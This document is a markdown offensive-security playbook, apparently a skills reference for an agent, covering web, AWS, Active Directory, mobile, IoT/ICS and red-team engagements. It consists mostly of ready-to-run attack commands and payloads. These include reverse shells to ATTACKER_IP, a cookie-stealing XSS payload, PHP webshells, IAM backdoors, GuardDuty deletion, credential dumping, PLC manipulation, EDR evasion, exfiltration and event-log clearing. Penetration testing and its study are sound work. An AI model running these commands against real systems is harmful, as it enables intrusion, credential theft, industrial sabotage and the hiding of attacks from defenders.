# KILLER QUEEN ENGAGEMENT PLAYBOOK
> Step-by-step playbooks for 6 engagement types. Each playbook: Phase 0→1→2→3→4 with specific skills, commands, and tools.

---

## PLAYBOOK 1: WEB APPLICATION PENTEST

### Phase 0: SCOPE & RECON
```
SKILLS: testing-methodology, bughunter-methodology, wordpress-recon
TOOLS: subfinder, amass, httpx, katana, gau, whatweb, nuclei

1. Confirm engagement type (bug bounty vs pentest vs red team)
2. Parse scope — identify in-scope domains, out-of-scope, program rules
3. Map attack surface:
   subfinder -d target.com -o subs.txt
   cat subs.txt | httpx -status-code -title -tech-detect -o live.txt
   katana -list live.txt -o urls.txt
   cat urls.txt | gau --subs >> all_urls.txt
   whatweb -i live.txt
4. JS bundle harvest:
   cat urls.txt | grep '\.js$' | while read url; do curl -s "$url" | grep -oE '(api[_-]?key|token|secret)["\s:=]+[A-Za-z0-9._-]+'; done
5. Nuclei scan: nuclei -l live.txt -t ~/nuclei-templates/ -severity critical,high
6. Framework/CMS fingerprinting: wpscan --url target.com --enumerate
```

### Phase 1: ENUMERATION
```
SKILLS: web-attacks, wordpress-pentesting
TOOLS: gobuster, ffuf, Burp Suite, sqlmap, ghauri

1. Directory brute-force:
   gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

2. Parameter discovery:
   ffuf -u https://target.com/endpoint?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

3. GF pattern classification:
   cat all_urls.txt | gf sqli > sqli-candidates.txt
   cat all_urls.txt | gf ssrf > ssrf-candidates.txt
   cat all_urls.txt | gf xss > xss-candidates.txt

4. Identity fabric mapping:
   curl -s https://target.com/.well-known/openid-configuration
   curl -s https://target.com/autodiscover/autodiscover.xml

5. API endpoints: check /graphql, /api, /swagger, /openapi.json, /.well-known/
6. robots.txt + sitemap.xml → probe every Disallow entry
```

### Phase 2: EXPLOITATION
```
SKILLS: web-attacks, bughunter-methodology, cloud-iam-attacks
TOOLS: sqlmap, commix, tplmap, Burp Collaborator, interactsh-client

SQL Injection:
  sqlmap -u "https://target.com/page?id=1" --batch --dbs
  sqlmap -u "https://target.com/page?id=1" --os-shell
  # WAF bypass: --tamper=space2comment --random-agent --delay=2

XSS:
  <script>fetch('https://COLLABORATOR/?c='+document.cookie)</script>
  # Blind XSS requires OOB confirmation via collaborator/interactsh

SSRF:
  # Probe internal metadata endpoints
  curl -X POST https://target.com/webhook -d 'url=http://169.254.169.254/latest/meta-data/'
  # OOB confirmation required: http://COLLABORATOR/

SSTI:
  {{7*7}} → 49 = Jinja2/Twig
  ${7*7} → 49 = Freemarker
  *{7*7} → 49 = Thymeleaf

Command Injection:
  ;id | $(id) | `id` | ;curl COLLABORATOR

File Upload:
  # Extension bypass: shell.php.jpg, shell.php%00.jpg
  # Magic bytes: GIF89a;<?php system($_GET['c']);?>
  # SVG: <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>

LFI→RCE:
  php://filter/convert.base64-encode/resource=config.php
  # Log poisoning: User-Agent: <?php system($_GET[cmd]);?>
  include /var/log/apache2/access.log?cmd=id

HTTP Request Smuggling (CL.TE/TE.CL):
  Use Turbo Intruder with smuggler.py scripts
  Target: Nginx+proxy chains, HAProxy ≤2.4
```

### Phase 3: POST-EXPLOITATION
```
SKILLS: infrastructure-attacks, cloud-iam-attacks, windows-red-team
TOOLS: reverse shell, webshell, Impacket

1. Upgrade to reverse shell:
   bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

2. Pivot enumeration:
   id; sudo -l; uname -a; cat /etc/os-release
   find / -perm -4000 -type f 2>/dev/null  # SUID
   getcap -r / 2>/dev/null                 # Capabilities
   linpeas.sh                              # Full enum
   ss -tlnp; ip a; cat /etc/hosts

3. Credential harvest:
   find / -name "*.key" -o -name "*.pem" -o -name "*id_rsa*" 2>/dev/null
   cat /etc/shadow 2>/dev/null
   env | grep -i "password\|secret\|token\|key"

4. Cloud metadata (if in cloud):
   curl -s http://169.254.169.254/latest/meta-data/
   curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Phase 4: REPORTING
```
SKILLS: bughunter-methodology, testing-methodology
FORMAT: Executive Summary → Attack Surface Map → Findings (per WSTG) → MITRE ATT&CK → Remediation

Each finding:
- WSTG-ID + CVSS + ATT&CK Technique
- Narrative (what, how, impact)
- Request/Response evidence with redacted cookies/PII
- Step-by-step reproduction
- Remediation guidance

7-Question Gate (validate before reporting):
Q1: Real HTTP request NOW? Q2: Impact accepted by program?
Q3: Asset in-scope? Q4: Works WITHOUT admin?
Q5: Not already known? Q6: Impact beyond "technically possible"?
Q7: Not on never-submit list?
```

---

## PLAYBOOK 2: CLOUD SECURITY ASSESSMENT (AWS)

### Phase 0: SCOPE & RECON
```
SKILLS: cloud-iam-attacks, infrastructure-attacks
TOOLS: aws-cli, ScoutSuite, cloudsplaining, Pacu, enumerate-iam

1. Configure credentials:
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   aws sts get-caller-identity

2. Cloud asset discovery:
   aws ec2 describe-instances --region us-east-1
   aws s3 ls
   aws iam list-users
   aws lambda list-functions
   aws rds describe-db-instances
   aws eks list-clusters

3. Automated audit:
   ScoutSuite aws --profile target
   cloudsplaining --input-file iam-policies.json
   enumerate-iam --access-key AKIA... --secret-key ...

4. Map trust boundaries:
   aws iam list-roles | jq '.Roles[].AssumeRolePolicyDocument'
   aws organizations list-accounts
```

### Phase 1: IAM ENUMERATION
```
SKILLS: cloud-iam-attacks
TOOLS: aws-cli, Pacu

1. Full IAM reconnaissance:
   aws iam list-users
   aws iam list-groups
   aws iam list-roles
   aws iam list-policies --scope Local
   aws iam get-account-authorization-details

2. Permission enumeration per principal:
   aws iam list-attached-user-policies --user-name TARGET
   aws iam list-user-policies --user-name TARGET
   aws iam list-attached-role-policies --role-name ROLE
   aws iam list-role-policies --role-name ROLE

3. Identify escalation paths:
   # Check for: iam:PutUserPolicy, iam:AttachUserPolicy, iam:CreatePolicyVersion
   # iam:PassRole+Lambda, iam:UpdateAssumeRolePolicy
   # iam:CreateAccessKey, iam:CreateLoginProfile

4. Pacu automated:
   python3 pacu.py
   > import_keys TARGET
   > run iam__enum_permissions
   > run iam__privesc_scan
```

### Phase 2: EXPLOITATION
```
SKILLS: cloud-iam-attacks
TOOLS: aws-cli, Pacu

Privilege Escalation Paths (30 total):

1. iam:PutUserPolicy → Admin inline policy:
   aws iam put-user-policy --user-name TARGET --policy-name privesc \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

2. iam:AttachUserPolicy → Admin managed policy:
   aws iam attach-user-policy --user-name TARGET \
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

3. iam:CreateAccessKey → Keys for privileged user:
   aws iam create-access-key --user-name PRIVILEGED_USER

4. iam:UpdateAssumeRolePolicy → Modify trust:
   aws iam update-assume-role-policy --role-name ADMIN_ROLE \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"YOUR_ARN"},"Action":"sts:AssumeRole"}]}'

5. SSRF→IMDS→Credentials:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

6. Lambda backdoor:
   aws lambda create-function --function-name backdoor --runtime python3.9 \
     --role ROLE_ARN --handler index.handler --zip-file fileb://payload.zip
```

### Phase 3: POST-EXPLOITATION & PERSISTENCE
```
SKILLS: cloud-iam-attacks
TOOLS: aws-cli

Persistence Methods:
1. IAM user access keys (survive password resets):
   aws iam create-access-key --user-name EXISTING_USER

2. Lambda triggers (persistent execution):
   aws lambda create-event-source-mapping

3. Role trust policy backdoor:
   aws iam update-assume-role-policy --role-name ROLE \
     --policy-document '{"Statement":[{"Effect":"Allow","Principal":{"AWS":"ATTACKER_ARN"},"Action":"sts:AssumeRole"}]}'

4. OIDC/RolesAnywhere:
   aws iam create-open-id-connect-provider

5. SSM access for persistent shell:
   aws ssm start-session --target INSTANCE_ID

GuardDuty Evasion:
- Disable GuardDuty: aws guardduty delete-detector
- Suppress findings: aws guardduty archive-findings
- Use whitelisted IPs, throttle API calls
```

### Phase 4: REPORTING
```
- IAM privilege escalation paths with exact permission combos
- S3 bucket misconfigurations → data exfiltration PoC
- Lambda backdoor persistence proof
- Cross-account trust analysis
- MITRE ATT&CK Cloud Matrix mapping
- Remediation: least privilege, SCPs, CloudTrail monitoring
```

---

## PLAYBOOK 3: ACTIVE DIRECTORY ATTACK

### Phase 0: RECON
```
SKILLS: windows-red-team, infrastructure-attacks
TOOLS: nmap, CrackMapExec, BloodHound, PowerView

1. Network discovery:
   nmap -sC -sV -p 88,389,636,3268,3269,445,139,135,3389 10.0.0.0/24
   CrackMapExec smb 10.0.0.0/24

2. DNS enumeration:
   nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.local
   adidnsdump -u 'DOMAIN\user' -p 'pass' dc_ip

3. Unauthenticated enumeration:
   nxc smb 10.0.0.0/24 --shares
   enum4linux -a dc_ip
```

### Phase 1: ENUMERATION
```
SKILLS: windows-red-team
TOOLS: BloodHound (SharpHound), PowerView, CrackMapExec, kerbrute

1. BloodHound collection:
   SharpHound.exe -c All --zipfilename domain.zip
   # Upload to BloodHound GUI → analyze attack paths

2. User/Group enumeration:
   net user /domain
   net group "Domain Admins" /domain
   net group "Enterprise Admins" /domain

3. PowerView (if on domain-joined machine):
   Get-NetUser | select samaccountname,userprincipalname,admincount
   Get-NetGroup "Domain Admins" | select member
   Get-NetComputer | select dnshostname,operatingsystem

4. Service account discovery:
   Get-NetUser -SPN | select samaccountname,serviceprincipalname

5. Kerberoastable users:
   Get-NetUser -SPN | %{ Get-DomainUser -Identity $_.samaccountname }
```

### Phase 2: EXPLOITATION
```
SKILLS: windows-red-team
TOOLS: Impacket, Rubeus, mimikatz, CrackMapExec

1. Kerberoasting:
   GetUserSPNs.py DOMAIN/user:password -dc-ip dc_ip -request
   hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

2. AS-REP Roasting (no preauth):
   GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat

3. Password spray:
   CrackMapExec smb 10.0.0.0/24 -u users.txt -p 'Spring2024!'

4. LLMNR/NBT-NS Poisoning (internal):
   responder -I eth0 -wv

5. Pass-the-Hash:
   CrackMapExec smb 10.0.0.0/24 -u Administrator -H 'NTLM_HASH'

6. Pass-the-Ticket:
   Rubeus.exe ptt /ticket:admin.kirbi

7. Golden Ticket:
   mimikatz "kerberos::golden /domain:DOMAIN /sid:SID /user:Administrator /krbtgt:HASH /ptt"

8. DCSync:
   mimikatz "lsadump::dcsync /domain:DOMAIN /user:Administrator"

9. AD CS ESC1-13:
   Certipy find -u user -p pass -dc-ip dc_ip -vulnerable
```

### Phase 3: POST-EXPLOITATION
```
SKILLS: windows-red-team, malware-dev
TOOLS: mimikatz, Impacket, Sliver/CobaltStrike

1. Credential dump:
   mimikatz "privilege::debug" "sekurlsa::logonpasswords"
   procdump.exe -accepteula -ma lsass.exe lsass.dmp
   mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

2. NTDS.dit extraction:
   ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

3. Persistence:
   # Golden Ticket (krbtgt hash)
   # Skeleton Key: mimikatz "misc::skeleton"
   # WMI Event Subscription
   # Scheduled Task
   # AdminSDHolder modification

4. Lateral movement:
   Impacket-wmiexec DOMAIN/admin@target
   PsExec.exe \\target cmd.exe

5. Domain trust enumeration:
   Get-NetDomainTrust
   Get-NetForest
   Get-NetForestDomain
```

### Phase 4: REPORTING
```
- BloodHound attack path graph with hop-by-hop analysis
- MITRE ATT&CK Enterprise mapping (T1558, T1003, T1550, T1021)
- Credential exposure findings
- AD CS vulnerability impact
- Forest/domain trust analysis
- Remediation: LAPS, tiered admin, PAM, Protected Users group
```

---

## PLAYBOOK 4: MOBILE APPLICATION TEST

### Phase 0: RECON & ACQUISITION
```
SKILLS: mobile-attacks
TOOLS: adb, apktool, jadx, objection, Frida

1. Device setup:
   adb devices
   adb root
   adb connect DEVICE_IP:5555

2. App acquisition:
   adb shell pm list packages -3
   adb shell pm path com.target.app
   adb pull /data/app/.../base.apk target.apk

3. Full backup:
   adb backup -apk com.target.app -f target_backup.ab
   # Extract: (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; tail -c +25 backup.ab) | tar xfvz -
```

### Phase 1: STATIC ANALYSIS
```
SKILLS: mobile-attacks
TOOLS: apktool, jadx, apkanalyzer

1. Decompile:
   apktool d target.apk -o smali_out/
   jadx target.apk -d jadx_out/
   jadx-gui target.apk

2. Manifest analysis:
   grep -E "exported|permission|intent-filter" AndroidManifest.xml
   grep 'android:debuggable="true"' AndroidManifest.xml
   grep 'android:allowBackup="true"' AndroidManifest.xml
   apkanalyzer manifest print target.apk | grep -n -A4 -B2 'exported'

3. Secret extraction:
   grep -r "http://" jadx_out/
   grep -ri "password\|secret\|key\|token\|api_key" jadx_out/
   grep -r "BEGIN RSA\|BEGIN EC\|BEGIN PRIVATE" jadx_out/
   grep -r "exec\|Runtime.getRuntime\|ProcessBuilder" jadx_out/
   grep -r "addJavascriptInterface\|setJavaScriptEnabled\|loadUrl" jadx_out/

4. Native library analysis:
   unzip -j target.apk "lib/*/*.so" -d libs/
   nm -D libs/*.so | head
   objdump -T libs/*.so | grep Java_
   strings -n 6 libs/*.so | egrep -i 'frida|ptrace|gum|magisk|su|root'

5. Flutter/React Native:
   unzip -l target.apk | grep -E "libflutter|libapp|flutter_assets|kernel_blob"
```

### Phase 2: DYNAMIC ANALYSIS
```
SKILLS: mobile-attacks
TOOLS: Frida, objection, Burp Suite, adb

1. SSL Pinning bypass:
   frida -U -l frida-scripts/ssl-pinning-bypass.js -f com.target.app
   objection -g com.target.app explore
   android sslpinning disable
   ios sslpinning disable

2. Root/Jailbreak bypass:
   objection -g com.target.app explore
   android root disable
   ios jailbreak disable

3. Runtime instrumentation:
   objection -g com.target.app explore
   android hooking list classes
   android hooking watch class_method com.target.ClassName.methodName

4. Logcat monitoring:
   adb logcat | grep $(adb shell pidof com.target.app)

5. Intent fuzzing:
   adb shell am start -n com.target/.Activity --es key val
   adb shell am broadcast -a com.target.ACTION --es key val

6. Content Provider exploitation:
   adb shell content query --uri content://com.target.provider/path

7. WebView attacks:
   # Test for: setJavaScriptEnabled(true) + addJavascriptInterface
   javascript:alert(document.cookie)
```

### Phase 3: EXPLOITATION
```
SKILLS: mobile-attacks
TOOLS: apktool, apksigner, Frida

1. Smali modification (patch tamper detection):
   apktool d target.apk -o smali_out/
   # Edit: const/4 v0, 0x1 → return v0 (always true for bypasses)
   apktool b smali_out/ -o dist/app-unsigned.apk

2. Re-sign:
   keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias demo
   zipalign -P 16 -f -v 4 dist/app-unsigned.apk dist/app-aligned.apk
   apksigner sign --ks key.jks --out dist/app-signed.apk dist/app-aligned.apk

3. Debug mode injection:
   # Modify AndroidManifest.xml: android:debuggable="true"
   # Then: adb shell am set-debug-app -w com.target.app

4. Runtime hooking for sensitive data:
   frida -U -l hook.js com.target.app
   // hook.js: Intercept crypto operations, key storage, credential entry
```

### Phase 4: REPORTING
```
- Insecure data storage (localStorage, SharedPreferences, SQLite)
- Hardcoded API keys/secrets
- Exported components (activities, providers, receivers)
- SSL pinning bypass → MITM demonstrated
- WebView JavaScript interface exploitation
- Root/jailbreak detection bypass
- Insecure deeplinks
- MITRE Mobile ATT&CK mapping
```

---

## PLAYBOOK 5: IOT / EMBEDDED ASSESSMENT

### Phase 0: HARDWARE RECON
```
SKILLS: embedded-iot-attacks
TOOLS: multimeter, Bus Pirate, JTAGulator, FTDI adapter, logic analyzer

1. Physical inspection:
   - Identify debug headers (4-pin UART, JTAG 10/20-pin)
   - Find SPI flash chips (8-pin SOIC)
   - Locate test points, serial numbers, FCC ID

2. Interface discovery:
   # UART: 4-pin headers (VCC, GND, TX, RX)
   # Multimeter: find GND (continuity), VCC (steady 3.3V/5V)
   # Remaining 2 = TX (toggling on boot) and RX
   # JTAGulator: auto-discover JTAG/SWD pins

3. Connect:
   picocom -b 115200 /dev/ttyUSB0 --flow n --parity n --stopbits 1
   screen /dev/ttyUSB0 115200
   minicom -D /dev/ttyUSB0 -b 115200
```

### Phase 1: FIRMWARE EXTRACTION & ANALYSIS
```
SKILLS: embedded-iot-attacks
TOOLS: flashrom, binwalk, unblob, EMBA, firmwalker

1. SPI flash dump:
   flashrom -p ft2232_spi:type=tigard -r firmware.bin

2. eMMC dump:
   SNANDer -r /dev/mmcblk0 -o emmc_dump.bin

3. Extraction:
   unblob -e . firmware.bin
   binwalk -Me firmware.bin

4. Analysis:
   EMBA -l ./logs -f firmware.bin
   firmwalker.sh _firmware.extracted/ results.txt

5. Credential search:
   find _firmware.extracted/ -type f -exec strings {} \; | grep -iE 'password|passwd|secret|key|token|admin|root|backdoor'

6. Hardcoded IPs:
   find _firmware.extracted/ -type f -exec strings {} \; | grep -oE 'https?://[^"'\'' ]+' | sort -u

7. Injection points:
   grep -rn 'eval\|system\|exec\|popen\|os.system' _firmware.extracted/ --include='*.sh' --include='*.lua' --include='*.py' --include='*.cgi'
```

### Phase 2: EMULATION & DYNAMIC ANALYSIS
```
SKILLS: embedded-iot-attacks
TOOLS: QEMU, Qiling Framework, FirmAE, Firmadyne

1. QEMU system emulation:
   qemu-system-arm -M vexpress-a9 -kernel zImage -initrd initramfs.cpio.gz -nographic -append "console=ttyAMA0"

2. QEMU user-mode:
   qemu-arm -L /usr/arm-linux-gnueabihf/ ./busybox ls
   qemu-mips -strace ./binary

3. Qiling Framework:
   python3 -c "
   from qiling import Qiling
   ql = Qiling(['binary.elf'], 'rootfs/')
   ql.run()
   "

4. Firmware emulation:
   FirmAE/run.sh -c <brand> firmware.bin

5. Protocol fuzzing:
   # Modbus: modbus-cli, pyModbus
   # DNP3: opendnp3
   # OPC-UA: opcua-asyncio

6. CWE vulnerability scan:
   cwe_checker firmware.bin
```

### Phase 3: IOT/ICS EXPLOITATION
```
SKILLS: embedded-iot-attacks, infrastructure-attacks
TOOLS: custom payloads, QEMU, OpenOCD

1. U-Boot shell exploitation:
   # Interrupt autoboot → U-Boot shell
   md.l 0x80000000 0x100  # Memory dump
   # Modify bootargs for single-user mode
   # Flash modified firmware

2. JTAG debug exploitation:
   openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
   arm-none-eabi-gdb -ex "target remote :3333"
   # Dump memory, patch code, extract secrets

3. ICS protocol attacks:
   # PLC stop: Modbus write to control register
   # Setpoint manipulation: DNP3 write to analog output
   # Firmware upload: S7comm PLC program download

4. UEFI/SPI persistence:
   # Dump SPI flash → modify bootloader → reflash
   # Sinkclose, LogoFAIL, PixieFail vectors
   # Persistence survives OS reinstall
```

### Phase 4: REPORTING
```
- Hardware interfaces exposed (UART, JTAG, SPI)
- Firmware vulnerabilities (hardcoded creds, injection, outdated components)
- Secure Boot bypass / UEFI attack surface
- ICS/SCADA protocol weaknesses
- Physical attack surface & tamper resistance
- Remediation: secure boot, encrypted firmware, disabled debug
```

---

## PLAYBOOK 6: RED TEAM / FULL SPECTRUM

### Phase 0: EXTERNAL RECON (OSINT)
```
SKILLS: threat-intel, social-engineering-wireless, bughunter-methodology
TOOLS: theHarvester, Shodan, Google dorks, LinkedIn scraping, WHOIS

1. Organization mapping:
   - Company structure (LinkedIn, Crunchbase, SEC filings)
   - Email format discovery (Hunter.io, phonebook.cz)
   - Social media footprint (Twitter, GitHub, Glassdoor)
   - Breach data (HaveIBeenPwned, DeHashed, IntelX)

2. External infrastructure:
   subfinder -d target.com -o subs.txt
   shodan domain:target.com
   Amass enum -passive -d target.com
   # Check: Jenkins, Grafana, GitLab, Jira, Confluence, Sharepoint

3. Email security:
   dig target.com MX
   dig target.com TXT | grep spf
   dig _dmarc.target.com TXT
   # Missing DMARC + weak SPF = email spoofing as CEO

4. Certificate transparency:
   crt.sh → %.target.com
   certspotter → target.com
```

### Phase 1: INITIAL ACCESS
```
SKILLS: social-engineering-wireless, web-attacks, cloudflare-bypass
TOOLS: GoPhish, EvilGinx2, password spray, o365enum

1. Credential attacks:
   o365spray --validate --domain target.com
   CredMaster --domain target.com --userfile users.txt --password 'SeasonYear!'
   kerbrute userenum -d target.com users.txt

2. Phishing:
   GoPhish → Office 365/M365 login clone → credential harvest
   EvilGinx2 → MFA bypass via session cookie capture
   # Phishlet for: Office 365, Google Workspace, Okta, Citrix

3. Web exploitation:
   nuclei -l live_hosts.txt -severity critical,high
   # Target: VPN portals (Citrix, Pulse, FortiGate), OWA, SharePoint
   # SSRF→IMDS for AWS; path traversal for config files

4. Physical:
   RFID cloning (Proxmark3), BadUSB drops, rogue WiFi (EvilAP)
```

### Phase 2: ESTABLISH FOOTHOLD
```
SKILLS: malware-dev, windows-red-team, cloudflare-bypass
TOOLS: Sliver, CobaltStrike, Pupy, custom implants

1. Implant deployment:
   # Sliver: mtls implant with custom JARM randomization
   # CobaltStrike: malleable C2 profile mimicking Teams/Office365 traffic
   # Pupy: multi-transport (obfs3, DNS, HTTP)

2. Evasion:
   # PPID spoofing (parent = explorer.exe)
   # Direct syscalls (SysWhispers, Hells Gate)
   # API unhooking (RefleXXion, SharpUnhooker)
   # RWX hunting (find existing allocations)
   # AMSI bypass, ETW patching, Defender exclusion

3. C2 setup:
   # Redirectors: CDN (Cloudflare Workers, Azure CDN), domain fronting
   # Protocols: HTTPS (mimic Teams), DNS txt, WebSocket over TLS
   # Infrastructure: AWS Lambda, GCP Cloud Run, Azure Functions
```

### Phase 3: INTERNAL RECON & PIVOT
```
SKILLS: windows-red-team, infrastructure-attacks, cloud-iam-attacks
TOOLS: BloodHound, Seatbelt, PingCastle, Inveigh, Responder

1. Situational awareness:
   Seatbelt.exe -group=all
   SharpView.exe Get-DomainUser -Properties samaccountname,admincount
   net user /domain; net group "Domain Admins" /domain

2. Credential harvesting:
   Inveigh.exe (LLMNR/NBT-NS/mDNS spoofing)
   Responder -I eth0 -wv
   mimikatz sekurlsa::logonpasswords
   Kerberoasting: Rubeus kerberoast

3. Lateral movement:
   CrackMapExec smb 10.0.0.0/24 -u user -p pass
   Impacket-wmiexec DOMAIN/admin@target
   PSExec, WinRM, RDP

4. Cloud pivot:
   # Check for Azure AD Connect, AWS AD Connector
   # SSRF→IMDS→cloud credentials
   # On-prem to cloud trust exploitation
   # Cross-account role assumption
```

### Phase 4: OBJECTIVE & EXFIL & REPORT
```
SKILLS: windows-red-team, malware-dev, defensive-forensics
TOOLS: rclone, megatools, custom exfil tools

1. Data discovery:
   find_files sensitive extensions on file shares
   SQL server enumeration (PowerUpSQL)
   SharePoint/OneDrive document harvest

2. Exfiltration:
   # Over C2 (fragmented, compressed, encrypted)
   # DNS tunneling (iodine, dnscat2)
   # Cloud storage (rclone → mega/gdrive/s3)
   # Scheduled, rate-limited to blend with normal traffic

3. Persistence (long-term):
   Golden Ticket (krbtgt hash)
   Skeleton Key (LSASS patching)
   WMI Event Subscription
   Scheduled Tasks + COM hijack
   Azure AD backdoor (service principal, app registration)

4. Cleanup:
   Timestomp artifacts, clear event logs, remove tools

5. Final Report:
   - Executive Summary with crown jewel narrative
   - Full attack path graph (external→DA→cloud)
   - MITRE ATT&CK mapping per phase
   - Defensive observations (what caught us, what didn't)
   - IoCs and detection guidance
   - Remediation roadmap (immediate → 30-day → 90-day)
```

---

## CROSS-PLAYBOOK REFERENCE: SKILLS BY PHASE

| Phase | Web Pentest | Cloud AWS | AD Attack | Mobile | IoT/Embedded | Red Team |
|-------|-------------|-----------|-----------|--------|--------------|----------|
| 0: Recon | testing-methodology, wordpress-recon | cloud-iam-attacks | windows-red-team | mobile-attacks | embedded-iot-attacks | threat-intel, social-engineering-wireless |
| 1: Enum | web-attacks, bughunter-methodology | cloud-iam-attacks | windows-red-team | mobile-attacks | embedded-iot-attacks | web-attacks, cloudflare-bypass |
| 2: Exploit | web-attacks, exploit-development | cloud-iam-attacks | windows-red-team, exploit-development | mobile-attacks, exploit-development | embedded-iot-attacks, infrastructure-attacks | windows-red-team, malware-dev, cloud-iam-attacks |
| 3: Post-Exploit | infrastructure-attacks, cloud-iam-attacks | cloud-iam-attacks | windows-red-team, malware-dev | mobile-attacks | embedded-iot-attacks | malware-dev, defensive-forensics |
| 4: Report | bughunter-methodology, testing-methodology | cloud-iam-attacks | windows-red-team | mobile-attacks | embedded-iot-attacks | threat-intel, defensive-forensics |

---

## COMMON COMMANDS ACROSS ALL PLAYBOOKS

### Recon
```
subfinder -d target.com -o subs.txt
httpx -l subs.txt -sc -title -td -o live.txt
katana -list live.txt -o urls.txt
gau --subs >> all_urls.txt
nuclei -l live.txt -t nuclei-templates/ -severity critical,high -o nuclei-results.txt
```

### Web Exploitation
```
sqlmap -u URL --batch --dbs
ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
commix --url URL --os-shell
tplmap -u URL
```

### Linux Privesc
```
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
curl -L peass.link/linpeas.sh | sh
```

### Windows/AD
```
net user /domain
nxc smb NET/24
SharpHound.exe -c All
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
GetUserSPNs.py DOMAIN/user -request
Rubeus.exe kerberoast
```

### Cloud
```
aws sts get-caller-identity
aws iam list-roles
aws s3 ls
ScoutSuite aws
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

> All skills at: /root/prometheus-agent/skills-backup/
> Reference files at: /root/killer-queen-knowledge/
> Generated from Killer Queen skills — June 2026
